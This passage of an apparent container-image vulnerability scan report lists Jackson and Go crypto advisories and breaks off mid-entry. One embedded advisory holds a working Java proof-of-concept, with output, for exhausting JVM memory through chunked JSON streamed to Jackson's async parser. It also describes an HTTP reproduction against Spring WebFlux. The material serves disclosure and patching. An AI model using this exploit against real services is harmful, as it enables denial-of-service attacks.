```yaml
╭ [0] ╭ Target: nmaguiar/gcutils:build (alpine 3.24.0) 
│     ├ Class : os-pkgs 
│     ╰ Type  : alpine 
├ [1] ╭ Target         : Java 
│     ├ Class          : lang-pkgs 
│     ├ Type           : jar 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-r7wm-3cxj-wff9 
│                       │     ├ PkgName         : com.fasterxml.jackson.core:jackson-core 
│                       │     ├ PkgPath         : openaf/openaf.jar 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-core@2.22.0 
│                       │     │                  ╰ UID : 348817934bcfb1b0 
│                       │     ├ InstalledVersion: 2.22.0 
│                       │     ├ FixedVersion    : 2.18.8, 2.21.4, 2.22.1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-r7wm-3cxj-wff9 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Maven 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Amaven 
│                       │     ├ Fingerprint     : sha256:e768faefb24fe6e27b930e6108a0afcee46bbce9f430b84d3f7fa1
│                       │     │                   13a43b82e9 
│                       │     ├ Title           : jackson-core: Async parser maxNumberLength bypass via chunked
│                       │     │                    digit accumulation (incomplete fix for
│                       │     │                   GHSA-72hv-8253-57qq) 
│                       │     ├ Description     : ## Summary
│                       │     │                   
│                       │     │                   The fix released in jackson-core `2.18.6` and `2.21.1` for
│                       │     │                   [GHSA-72hv-8253-57qq](https://github.com/FasterXML/jackson-co
│                       │     │                   re/security/advisories/GHSA-72hv-8253-57qq) (Number Length
│                       │     │                   Constraint Bypass in Async Parser, published 2026-02-28) is
│                       │     │                   incomplete. The fix commit `b0c428e6` (#1555) wired
│                       │     │                   `validateIntegerLength` into a new `_setIntLength` helper and
│                       │     │                    called it at every place where the integer portion of a
│                       │     │                   number is *decided* (terminator byte arrived, `.` / `e/E`
│                       │     │                   seen, end-of-feed inside a fully-buffered value). It did not
│                       │     │                   call it on the much more attacker-relevant path: "ran out of
│                       │     │                   input while still inside `MINOR_NUMBER_INTEGER_DIGITS`,
│                       │     │                   return `NOT_AVAILABLE` to caller".
│                       │     │                   As a result, an attacker who streams JSON to a non-blocking
│                       │     │                   parser in many small chunks, without ever sending a
│                       │     │                   terminator byte, can keep the parser inside
│                       │     │                   `MINOR_NUMBER_INTEGER_DIGITS` indefinitely.
│                       │     │                   `_textBuffer.expandCurrentSegment()` grows on every chunk,
│                       │     │                   and `validateIntegerLength` is never invoked. The accumulator
│                       │     │                    is only gated by `maxStringLength` (20 MiB default) — a
│                       │     │                   **~20,000x amplification** of the documented
│                       │     │                   `maxNumberLength` (1000 default).
│                       │     │                   This is the same vulnerability class, same advisory wording
│                       │     │                   ("Memory Exhaustion: Unbounded allocation in TextBuffer from
│                       │     │                   excessively long numbers"), same parser class — just the
│                       │     │                   streaming path the original fix didn't cover. The fix to the
│                       │     │                   *fraction* path is correct (see `_finishFloatFraction` at
│                       │     │                   line 1834-1837 of `NonBlockingUtf8JsonParserBase.java` in
│                       │     │                   2.18.6, where `_setFractLength(fractLen)` IS called before
│                       │     │                   the `NOT_AVAILABLE` return); the equivalent call is missing
│                       │     │                   from every integer-digit path.
│                       │     │                   ## Affected versions
│                       │     │                   Verified on the patched releases:
│                       │     │                   - `com.fasterxml.jackson.core:jackson-core` **2.18.6**
│                       │     │                   - `com.fasterxml.jackson.core:jackson-core` **2.21.1**
│                       │     │                   Structurally identical code in `tools.jackson.core` 3.0.x /
│                       │     │                   3.1.x — same `NonBlockingUtf8JsonParserBase` class, same
│                       │     │                   `_setIntLength` rollout, same NOT_AVAILABLE returns without
│                       │     │                   validation. Not retested but presumed vulnerable.
│                       │     │                   ## Affected code
│                       │     │                   [`src/main/java/com/fasterxml/jackson/core/json/async/NonBloc
│                       │     │                   kingUtf8JsonParserBase.java`](https://github.com/FasterXML/ja
│                       │     │                   ckson-core/blob/b0c428e6/src/main/java/com/fasterxml/jackson/
│                       │     │                   core/json/async/NonBlockingUtf8JsonParserBase.java) in 2.18.6
│                       │     │                    / 2.21.1.
│                       │     │                   ### Site 1 — `_startPositiveNumber(int ch)` lines 1320-1330:
│                       │     │                   ```java
│                       │     │                   if (outPtr >= outBuf.length) {
│                       │     │                       // NOTE: must expand to ensure contents all in a single
│                       │     │                   buffer (to keep
│                       │     │                       // other parts of parsing simpler)
│                       │     │                       outBuf = _textBuffer.expandCurrentSegment();
│                       │     │                   }
│                       │     │                   outBuf[outPtr++] = (char) ch;
│                       │     │                   if (++_inputPtr >= _inputEnd) {
│                       │     │                       _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│                       │     │                       _textBuffer.setCurrentLength(outPtr);
│                       │     │                       return _updateTokenToNA();          // <-- no
│                       │     │                   validateIntegerLength(outPtr)
│                       │     │                   ```
│                       │     │                   ### Site 2 — `_finishNumberIntegralPart` lines 1691-1727:
│                       │     │                   protected JsonToken _finishNumberIntegralPart(char[] outBuf,
│                       │     │                   int outPtr) throws IOException {
│                       │     │                       int negMod = _numberNegative ? -1 : 0;
│                       │     │                       while (true) {
│                       │     │                           if (_inputPtr >= _inputEnd) {
│                       │     │                               _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│                       │     │                               _textBuffer.setCurrentLength(outPtr);
│                       │     │                               return _updateTokenToNA();    // <-- no
│                       │     │                   validateIntegerLength(outPtr + negMod)
│                       │     │                           }
│                       │     │                           int ch = getByteFromBuffer(_inputPtr) & 0xFF;
│                       │     │                           if (ch < INT_0) {
│                       │     │                               if (ch == INT_PERIOD) {
│                       │     │                                   _setIntLength(outPtr+negMod);   // <--
│                       │     │                   validated here
│                       │     │                                   ++_inputPtr;
│                       │     │                                   return _startFloat(outBuf, outPtr, ch);
│                       │     │                               }
│                       │     │                               break;
│                       │     │                           if (ch > INT_9) {
│                       │     │                               if ((ch | 0x20) == INT_e) {
│                       │     │                           ++_inputPtr;
│                       │     │                           if (outPtr >= outBuf.length) {
│                       │     │                               outBuf = _textBuffer.expandCurrentSegment();
│                       │     │                           outBuf[outPtr++] = (char) ch;
│                       │     │                       }
│                       │     │                       _setIntLength(outPtr+negMod);            // <-- validated
│                       │     │                    here
│                       │     │                       return _valueComplete(JsonToken.VALUE_NUMBER_INT);
│                       │     │                   The pattern recurs at lines 1297, 1329, 1343, 1365, 1395,
│                       │     │                   1409, 1437, 1467, 1481, 1586, 1644, 1698 — every "ran out of
│                       │     │                   input mid-integer" exit returns to the caller without
│                       │     │                   validating the accumulator length.
│                       │     │                   ### Compare with the fraction path that is correct
│                       │     │                   `_finishFloatFraction` lines 1827-1838:
│                       │     │                   while (loop) {
│                       │     │                       if (ch >= INT_0 && ch <= INT_9) {
│                       │     │                           ++fractLen;
│                       │     │                               _setFractLength(fractLen);          // <--
│                       │     │                   VALIDATED
│                       │     │                               return JsonToken.NOT_AVAILABLE;
│                       │     │                           ch = getNextSignedByteFromBuffer();
│                       │     │                       ...
│                       │     │                   ## Impact
│                       │     │                   Reactive frameworks (Spring WebFlux / Reactor, Quarkus,
│                       │     │                   Helidon, Vert.x JSON, anything wrapping
│                       │     │                   `JsonFactory.createNonBlockingByteArrayParser()` or
│                       │     │                   `createNonBlockingByteBufferParser()`) feed inbound HTTP/gRPC
│                       │     │                    bytes to the async parser as they arrive. Operators who set
│                       │     │                   `StreamReadConstraints.builder().maxNumberLength(N)` on the
│                       │     │                   assumption that this caps memory per number value are not
│                       │     │                   getting that guarantee in chunked-feed scenarios. The parser
│                       │     │                   silently accumulates digits up to `maxStringLength` (20 MiB
│                       │     │                   default) per concurrent connection. Multiply by
│                       │     │                   attacker-controlled concurrency to OOM the JVM.
│                       │     │                   The synchronous parsers (`UTF8StreamJsonParser`,
│                       │     │                   `ReaderBasedJsonParser`) and the async parser on *complete*
│                       │     │                   input are not affected — those paths go through
│                       │     │                   `_setIntLength` or `ParserBase._reportTooLongIntegral`
│                       │     │                   correctly.
│                       │     │                   CWE-770 (Allocation of Resources Without Limits or
│                       │     │                   Throttling), CVSS roughly the same as the parent advisory
│                       │     │                   (Network / Low complexity / High availability impact). The
│                       │     │                   parent advisory was scored CVSS 8.7 High.
│                       │     │                   ## Proof of concept
│                       │     │                   Standalone PoC, no Maven required:
│                       │     │                   mkdir poc && cd poc
│                       │     │                   curl -sLo jackson-core-2.18.6.jar
│                       │     │                   https://repo1.maven.org/maven2/com/fasterxml/jackson/core/jac
│                       │     │                   kson-core/2.18.6/jackson-core-2.18.6.jar
│                       │     │                   cat > PoC.java <<'EOF'
│                       │     │                   import com.fasterxml.jackson.core.*;
│                       │     │                   import com.fasterxml.jackson.core.async.ByteArrayFeeder;
│                       │     │                   public class PoC {
│                       │     │                       public static void main(String[] args) throws Exception
│                       │     │                   {
│                       │     │                           StreamReadConstraints strict =
│                       │     │                   StreamReadConstraints.builder()
│                       │     │                                   .maxNumberLength(1000)
│                       │     │                                   .build();
│                       │     │                           JsonFactory f = new JsonFactoryBuilder()
│                       │     │                                   .streamReadConstraints(strict)
│                       │     │                           // Sanity: synchronous parser rejects 5000-digit
│                       │     │                   int.
│                       │     │                           try (JsonParser p = f.createParser("{\"v\":" +
│                       │     │                   "1".repeat(5000) + "}")) {
│                       │     │                               while (p.nextToken() != null) { /* drive */ }
│                       │     │                               System.out.println("[-] BUG ABSENT: sync parser
│                       │     │                   accepted");
│                       │     │                               return;
│                       │     │                           } catch (Exception e) {
│                       │     │                               System.out.println("[+] sync parser rejected
│                       │     │                   5000-digit int: " + e.getClass().getSimpleName());
│                       │     │                           // Bug: async parser, chunked, no terminator.
│                       │     │                           JsonParser ap =
│                       │     │                   f.createNonBlockingByteArrayParser();
│                       │     │                           ByteArrayFeeder feeder = (ByteArrayFeeder) ap;
│                       │     │                           byte[] preamble = "{\"v\":".getBytes("UTF-8");
│                       │     │                           feeder.feedInput(preamble, 0, preamble.length);
│                       │     │                           while (ap.nextToken() != JsonToken.NOT_AVAILABLE) {
│                       │     │                   /* drain */ }
│                       │     │                           byte[] digits = new byte[16 * 1024];
│                       │     │                           for (int i = 0; i < digits.length; i++) digits[i] =
│                       │     │                   (byte) ('1' + (i % 9));
│                       │     │                           for (int c = 0; c < 600; c++) {
│                       │     │                               feeder.feedInput(digits, 0, digits.length);
│                       │     │                               JsonToken t = ap.nextToken();
│                       │     │                               if (t != JsonToken.NOT_AVAILABLE) {
│                       │     │                                   System.out.println("[-] unexpected token: " +
│                       │     │                    t);
│                       │     │                                   return;
│                       │     │                           System.out.println("[+] BUG PRESENT: async parser
│                       │     │                   accepted ~9.83 MB of digits with maxNumberLength=1000");
│                       │     │                           // Closing the number now finally triggers the
│                       │     │                   validator.
│                       │     │                           feeder.feedInput("}".getBytes("UTF-8"), 0, 1);
│                       │     │                           feeder.endOfInput();
│                       │     │                           try {
│                       │     │                               while (ap.nextToken() != null) { /* drive */ }
│                       │     │                               System.out.println("[*] late rejection on close:
│                       │     │                   " + e.getMessage().split("\n")[0]);
│                       │     │                           ap.close();
│                       │     │                   EOF
│                       │     │                   javac -cp jackson-core-2.18.6.jar PoC.java
│                       │     │                   java -Xmx256m -cp jackson-core-2.18.6.jar:. PoC
│                       │     │                   Observed output against `jackson-core-2.18.6`:
│                       │     │                   [+] sync parser rejected 5000-digit int:
│                       │     │                   StreamConstraintsException
│                       │     │                   [+] BUG PRESENT: async parser accepted ~9.83 MB of digits
│                       │     │                   with maxNumberLength=1000
│                       │     │                   [*] late rejection on close: Number value length (9830400)
│                       │     │                   exceeds the maximum allowed (1000, from
│                       │     │                   `StreamReadConstraints.getMaxNumberLength()`)
│                       │     │                   Observed output against `jackson-core-2.21.1`: identical.
│                       │     │                   The 9.83 MB figure is purely a function of the loop bound
│                       │     │                   (600 chunks * 16 KiB). The actual ceiling is `maxStringLength
│                       │     │                    = 20 MiB`. With the strict policy declared as
│                       │     │                   `maxNumberLength = 1000`, the parser permits **9830x** more
│                       │     │                   allocation than the policy allows. With `maxStringLength`
│                       │     │                   left at the default 20 MiB, an attacker can drive a single
│                       │     │                   connection to 40 MiB of `char[]` heap (chars are 2 bytes
│                       │     │                   each) before the validator finally fires on
│                       │     │                   terminator/`endOfInput()`. Multiply by concurrent
│                       │     │                   connections.
│                       │     │                   ## End-to-end reproduction through real HTTP
│                       │     │                   Supplements the standalone PoC with a running Spring Boot
│                       │     │                   WebFlux server,
│                       │     │                   driving the same bug through the actual reactor-netty +
│                       │     │                   Jackson2JsonDecoder
│                       │     │                   streaming-decode path that production reactive endpoints
│                       │     │                   use.
│                       │     │                   Setup:
│                       │     │                   - Spring Boot 3.3.5 starter-webflux (spring-webflux 6.1.14,
│                       │     │                   reactor-netty 1.1.23)
│                       │     │                   - jackson-databind 2.17.2, jackson-core overridden:
│                       │     │                     - VULN run:
│                       │     │                   `com.fasterxml.jackson.core:jackson-core:2.18.7` (latest
│                       │     │                   published)
│                       │     │                     - PATCHED run: `2.18.8-SNAPSHOT` built from the fix branch
│                       │     │                   - JVM: OpenJDK 17.0.18
│                       │     │                   - Server `JsonFactory` configured with
│                       │     │                   `StreamReadConstraints.builder().maxNumberLength(1000).build(
│                       │     │                   )`
│                       │     │                   Endpoint under test exposes the `Flux<DataBuffer>` request
│                       │     │                   body directly to
│                       │     │                   `Jackson2JsonDecoder.decode(Flux, ResolvableType, ...)` so
│                       │     │                   the parser sees one
│                       │     │                   HTTP chunk per `feedInput` (the same pattern used for any
│                       │     │                   `@RequestBody Flux<...>` / streaming JSON decoder in
│                       │     │                   WebFlux). A raw-socket
│                       │     │                   HTTP/1.1 chunked client streams `{"v":1` then 250 chunks of
│                       │     │                   200 digit bytes
│                       │     │                   each (50,000 digits total) at 20ms intervals, then writes the
│                       │     │                    closing `}`.
│                       │     │                   VULN — jackson-core 2.18.7:
│                       │     │                   [VULN-SMALLCHUNK] streamed 50000 digits across 250 chunks;
│                       │     │                   server still accepting
│                       │     │                   [VULN-SMALLCHUNK] full POST sent (50000 digits). Response:
│                       │     │                   HTTP/1.1 200 OK
│                       │     │                   ERR after 6548ms
│                       │     │                   cause=com.fasterxml.jackson.core.exc.StreamConstraintsExcepti
│                       │     │                   on:
│                       │     │                          Number value length (50000) exceeds the maximum
│                       │     │                   allowed (1000, ...)
│                       │     │                   Server-side controller trace (250 DataBuffer arrivals
│                       │     │                   elided):
│                       │     │                   [ctrl] DataBuffer arrived size=6   ms=39       <- '{"v":1'
│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=42
│                       │     │                   ...
│                       │     │                   [ctrl] DataBuffer arrived size=199 ms=5993
│                       │     │                   [ctrl] DataBuffer arrived size=1   ms=6518     <- closing
│                       │     │                   '}'
│                       │     │                   [ctrl] ERR after 6548ms ... Number value length (50000)
│                       │     │                   exceeds ...
│                       │     │                   Server held all 50,000 digit characters in `_textBuffer` for
│                       │     │                   6.5 seconds with
│                       │     │                   `maxNumberLength=1000` declared. The validator never fires
│                       │     │                   during streaming;
│                       │     │                   it only fires at value-completion when the closing `}`
│                       │     │                   arrives.
│                       │     │                   PATCHED — jackson-core 2.18.8-SNAPSHOT (fix branch):
│                       │     │                   [PATCHED-SMALLCHUNK] connection broke after 2801 digits at
│                       │     │                   chunk 14: [Errno 32] Broken pipe
│                       │     │                   [PATCHED-SMALLCHUNK] DONE: digits_sent=2801
│                       │     │                   status=connection-broke-mid-stream
│                       │     │                   Server-side controller trace:
│                       │     │                   [ctrl] DataBuffer arrived size=6   ms=129
│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=142
│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=145
│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=146
│                       │     │                   [ctrl] DataBuffer arrived size=200 ms=147
│                       │     │                   [ctrl] ERR after 155ms ... Number value length (1001) exceeds
│                       │     │                    the maximum allowed (1000, ...)
│                       │     │                   Patched server raises `StreamConstraintsException` at 155ms
│                       │     │                   after only 5
│                       │     │                   DataBuffers, exactly when the accumulated digit count
│                       │     │                   crosses
│                       │     │                   `maxNumberLength=1000`. The connection is reset mid-stream
│                       │     │                   rather than the
│                       │     │                   parser silently consuming the rest of the attacker's
│                       │     │                   payload.
│                       │     │                   Side-by-side:
│                       │     │                   | Build | Chunks accepted before exception | Digits buffered
│                       │     │                   | Time to detection |
│                       │     │                   |---|---|---|---|
│                       │     │                   | jackson-core 2.18.7 | 250 (full payload) | 50,000 (50x the
│                       │     │                   configured limit) | 6,548ms — only at terminator |
│                       │     │                   | 2.18.8-SNAPSHOT (fix branch) | 5 | 1,001 | 155ms — moment
│                       │     │                   threshold crossed |
│                       │     │                   Note on the default `@RequestBody Mono<JsonNode>` path: that
│                       │     │                   path cannot
│                       │     │                   distinguish the two builds because Spring's `decodeToMono`
│                       │     │                   joins all
│                       │     │                   DataBuffers into one before parsing. The exploitable shape is
│                       │     │                    the
│                       │     │                   streaming-decode path (`Flux<JsonNode>` / `@RequestBody
│                       │     │                   Flux<...>` /
│                       │     │                   WebSocket / SSE / any direct
│                       │     │                   `decoder.decode(Flux<DataBuffer>, ...)` call),
│                       │     │                   which is also what `Jackson2Tokenizer` uses for any streaming
│                       │     │                    JSON
│                       │     │                   deserialization in WebFlux and Quarkus reactive REST.
│                       │     │                   ## Suggested fix
│                       │     │                   Mirror the pattern already used in `_finishFloatFraction`. At
│                       │     │                    every site that returns `_updateTokenToNA()` (or
│                       │     │                   `JsonToken.NOT_AVAILABLE`) with `_minorState =
│                       │     │                   MINOR_NUMBER_INTEGER_DIGITS`, call `_setIntLength(outPtr +
│                       │     │                   negMod)` first. Concretely, the diff to
│                       │     │                   `NonBlockingUtf8JsonParserBase.java` would be:
│                       │     │                   ```diff
│                       │     │                        protected JsonToken _finishNumberIntegralPart(char[]
│                       │     │                   outBuf, int outPtr) throws IOException {
│                       │     │                            int negMod = _numberNegative ? -1 : 0;
│                       │     │                            while (true) {
│                       │     │                                if (_inputPtr >= _inputEnd) {
│                       │     │                                    _minorState = MINOR_NUMBER_INTEGER_DIGITS;
│                       │     │                                    _textBuffer.setCurrentLength(outPtr);
│                       │     │                   +               
│                       │     │                   _streamReadConstraints.validateIntegerLength(outPtr +
│                       │     │                   negMod);
│                       │     │                                    return _updateTokenToNA();
│                       │     │                                }
│                       │     │                   Note: `_setIntLength` itself can't be used as-is because it
│                       │     │                   also assigns `_intLength`, and `_intLength` must not be set
│                       │     │                   until the integer is truly complete (subsequent fraction
│                       │     │                   handling reads `_intLength`). The minimal fix is to call only
│                       │     │                    the validator, as shown.
│                       │     │                   Apply the same one-line insertion before each `return
│                       │     │                   _updateTokenToNA();` that exits with `_minorState =
│                       │     │                   MINOR_NUMBER_INTEGER_DIGITS`. The sites are listed above (12
│                       │     │                   lines total).
│                       │     │                   Alternatively, a heavier refactor: also gate
│                       │     │                   `_textBuffer.expandCurrentSegment()` calls inside the
│                       │     │                   digit-accumulation loops on `outPtr < maxNumberLength` so
│                       │     │                   that the validator fires at the moment the buffer would be
│                       │     │                   enlarged past the limit, rather than waiting for the next
│                       │     │                   chunk boundary. Either approach is sufficient.
│                       │     │                   ## Credit
│                       │     │                   Reported by `tonghuaroot` (`tonghuaroot@gmail.com`). Variant
│                       │     │                   hunt against the Feb 2026 fix for GHSA-72hv-8253-57qq. 
│                       │     ├ Severity        : HIGH 
│                       │     ├ VendorSeverity   ─ ghsa: 3 
│                       │     ├ CVSS             ─ ghsa ╭ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:
│                       │     │                         │            N/VA:H/SC:N/SI:N/SA:N 
│                       │     │                         ╰ V40Score : 8.7 
│                       │     ├ References       ╭ [0]: https://github.com/FasterXML/jackson-core 
│                       │     │                  ├ [1]: https://github.com/FasterXML/jackson-core/commit/050b42
│                       │     │                  │      9804dce2a7e08f0be1b0b4c3d040fdb9cd 
│                       │     │                  ├ [2]: https://github.com/FasterXML/jackson-core/commit/4cdd52
│                       │     │                  │      9749da396cc7edf6d4a2aad41d47902641 
│                       │     │                  ├ [3]: https://github.com/FasterXML/jackson-core/commit/c5941e
│                       │     │                  │      5aae7fd5aeac55d66933cfb82b9aabeef8 
│                       │     │                  ├ [4]: https://github.com/FasterXML/jackson-core/pull/1611 
│                       │     │                  ╰ [5]: https://github.com/FasterXML/jackson-core/security/advi
│                       │     │                         sories/GHSA-r7wm-3cxj-wff9 
│                       │     ├ PublishedDate   : 2026-07-21T21:58:53Z 
│                       │     ╰ LastModifiedDate: 2026-07-21T21:58:53Z 
│                       ├ [1] ╭ VulnerabilityID : CVE-2026-54515 
│                       │     ├ VendorIDs        ─ [0]: GHSA-5jmj-h7xm-6q6v 
│                       │     ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
│                       │     ├ PkgPath         : openaf/openaf.jar 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
│                       │     │                  │       2.22.0 
│                       │     │                  ╰ UID : c3b2e55f064f8b6 
│                       │     ├ InstalledVersion: 2.22.0 
│                       │     ├ FixedVersion    : 3.1.4, 2.18.9, 2.21.5, 2.22.1 
│                       │     ├ Status          : fixed 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ SeveritySource  : ghsa 
│                       │     ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-54515 
│                       │     ├ DataSource       ╭ ID  : ghsa 
│                       │     │                  ├ Name: GitHub Security Advisory Maven 
│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                       │     │                          osystem%3Amaven 
│                       │     ├ Fingerprint     : sha256:2dcfee7ef77e23b9c986f15c39b6e7ca69335ca0ed8a85f056838e
│                       │     │                   9a970e39d2 
│                       │     ├ Title           : jackson-databind: jackson-databind: Ignored properties can be
│                       │     │                    unexpectedly modified 
│                       │     ├ Description     : jackson-databind contains the general-purpose data-binding
│                       │     │                   functionality and tree-model for Jackson Data Processor. From
│                       │     │                    2.8.0 until 2.18.9, 2.21.5, and 3.1.4, in
│                       │     │                   BeanDeserializerBase.createContextual(), per-property
│                       │     │                   @JsonIgnoreProperties exclusions are applied by
│                       │     │                   _handleByNameInclusion(), producing a contextual deserializer
│                       │     │                    whose BeanPropertyMap has the ignored properties removed.
│                       │     │                   The subsequent per-property case-insensitivity block
│                       │     │                   (triggered by
│                       │     │                   @JsonFormat(ACCEPT_CASE_INSENSITIVE_PROPERTIES)) rebuilds
│                       │     │                   from this._beanProperties (the original, unfiltered map)
│                       │     │                   instead of contextual._beanProperties, then overwrites the
│                       │     │                   filtered map — restoring every property
│                       │     │                   _handleByNameInclusion had just removed. The ignored property
│                       │     │                    becomes writable again. This vulnerability is fixed in
│                       │     │                   2.18.9, 2.21.5, and 3.1.4. 
│                       │     ├ Severity        : MEDIUM 
│                       │     ├ CweIDs           ─ [0]: CWE-915 
│                       │     ├ VendorSeverity   ╭ amazon: 3 
│                       │     │                  ├ ghsa  : 2 
│                       │     │                  ╰ redhat: 2 
│                       │     ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
│                       │     │                  │        │           A:N 
│                       │     │                  │        ╰ V3Score : 5.3 
│                       │     │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/
│                       │     │                           │           A:N 
│                       │     │                           ╰ V3Score : 5.3 
│                       │     ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-54515 
│                       │     │                  ├ [1]: https://github.com/FasterXML/jackson-databind 
│                       │     │                  ├ [2]: https://github.com/FasterXML/jackson-databind/commit/0e
│                       │     │                  │      1b0b211f7a53baa62ba2f4c9bd006c7bf4d5fa 
│                       │     │                  ├ [3]: https://github.com/FasterXML/jackson-databind/issues/5962 
│                       │     │                  ├ [4]: https://github.com/FasterXML/jackson-databind/issues/5964 
│                       │     │                  ├ [5]: https://github.com/FasterXML/jackson-databind/security/
│                       │     │                  │      advisories/GHSA-5jmj-h7xm-6q6v 
│                       │     │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-54515 
│                       │     │                  ╰ [7]: https://www.cve.org/CVERecord?id=CVE-2026-54515 
│                       │     ├ PublishedDate   : 2026-06-23T21:17:02.597Z 
│                       │     ╰ LastModifiedDate: 2026-06-29T13:38:59.057Z 
│                       ╰ [2] ╭ VulnerabilityID : CVE-2026-59889 
│                             ├ VendorIDs        ─ [0]: GHSA-5gvw-p9qm-jgwh 
│                             ├ PkgName         : com.fasterxml.jackson.core:jackson-databind 
│                             ├ PkgPath         : openaf/openaf.jar 
│                             ├ PkgIdentifier    ╭ PURL: pkg:maven/com.fasterxml.jackson.core/jackson-databind@
│                             │                  │       2.22.0 
│                             │                  ╰ UID : c3b2e55f064f8b6 
│                             ├ InstalledVersion: 2.22.0 
│                             ├ FixedVersion    : 2.21.5, 2.18.9, 2.22.1 
│                             ├ Status          : fixed 
│                             ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                             │                  │         6997c001601e2a6e5af 
│                             │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                             │                            e154f0b8ad928e980c9 
│                             ├ SeveritySource  : ghsa 
│                             ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-59889 
│                             ├ DataSource       ╭ ID  : ghsa 
│                             │                  ├ Name: GitHub Security Advisory Maven 
│                             │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
│                             │                          osystem%3Amaven 
│                             ├ Fingerprint     : sha256:a101d4ab343eb51e70950c19d0ce1049aacd4f8f8c61cb3586f585
│                             │                   2bfa06cec0 
│                             ├ Title           : jackson-databind: @JsonView ypassed for @JsonUnwrapped
│                             │                   container properties on deserialization 
│                             ├ Description     : jackson-databind contains the general-purpose data-binding
│                             │                   functionality and tree-model for Jackson Data Processor. From
│                             │                    2.18.0 until 2.18.9, 2.21.5, 2.22.1, 3.1.5, and 3.2.1,
│                             │                   UnwrappedPropertyHandler.processUnwrapped() replays buffered
│                             │                   JSON for a @JsonUnwrapped property and calls
│                             │                   prop.deserializeAndSet() without a
│                             │                   prop.visibleInView(ctxt.getActiveView()) guard, allowing a
│                             │                   property annotated with both @JsonView and @JsonUnwrapped to
│                             │                   be written from attacker JSON under a less-privileged active
│                             │                   view. This issue is fixed in versions 2.18.9, 2.21.5, 2.22.1,
│                             │                    3.1.5, and 3.2.1. 
│                             ├ Severity        : MEDIUM 
│                             ├ CweIDs           ─ [0]: CWE-863 
│                             ├ VendorSeverity   ─ ghsa: 2 
│                             ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N 
│                             │                         ╰ V3Score : 6.5 
│                             ├ References       ╭ [0]: https://github.com/FasterXML/jackson-databind 
│                             │                  ├ [1]: https://github.com/FasterXML/jackson-databind/commit/d6
│                             │                  │      27a8a86fcb062429282f79f3f256f181ed2c7b 
│                             │                  ├ [2]: https://github.com/FasterXML/jackson-databind/issues/6060 
│                             │                  ├ [3]: https://github.com/FasterXML/jackson-databind/pull/6056 
│                             │                  ├ [4]: https://github.com/FasterXML/jackson-databind/security/
│                             │                  │      advisories/GHSA-5gvw-p9qm-jgwh 
│                             │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-59889 
│                             ├ PublishedDate   : 2026-07-14T21:17:06.16Z 
│                             ╰ LastModifiedDate: 2026-07-16T16:19:15.79Z 
├ [2] ╭ Target  : Node.js 
│     ├ Class   : lang-pkgs 
│     ├ Type    : node-pkg 
│     ╰ Packages 
├ [3] ╭ Target  : Python 
│     ├ Class   : lang-pkgs 
│     ├ Type    : python-pkg 
│     ╰ Packages 
├ [4] ╭ Target         : usr/bin/prometheus 
│     ├ Class          : lang-pkgs 
│     ├ Type           : gobinary 
│     ├ Packages        
│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GO-2026-5932 
│                       │     ├ PkgID           : golang.org/x/crypto@v0.52.0 
│                       │     ├ PkgName         : golang.org/x/crypto 
│                       │     ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.52.0 
│                       │     │                  ╰ UID : 2b26bad30f661468 
│                       │     ├ InstalledVersion: v0.52.0 
│                       │     ├ Status          : affected 
│                       │     ├ Layer            ╭ Digest: sha256:98a7b344c948845d318c21db5437a29354d19538e300c
│                       │     │                  │         6997c001601e2a6e5af 
│                       │     │                  ╰ DiffID: sha256:d39069cbf98f2f0d051ebefc817aed342512d10a9a172
│                       │     │                            e154f0b8ad928e980c9 
│                       │     ├ DataSource       ╭ ID  : govulndb 
│                       │     │                  ├ Name: The Go Vulnerability Database 
│                       │     │                  ╰ URL : https://pkg.go.dev/vuln/ 
│                       │     ├ Fingerprint     : sha256:ddd0197dc729d461f195ff3951124f70b05f0c20848d4516030e99
│                       │     │                   973dc22d91 
│                       │     ├ Title           : The golang.org/x/crypto/openpgp package is unmaintained,
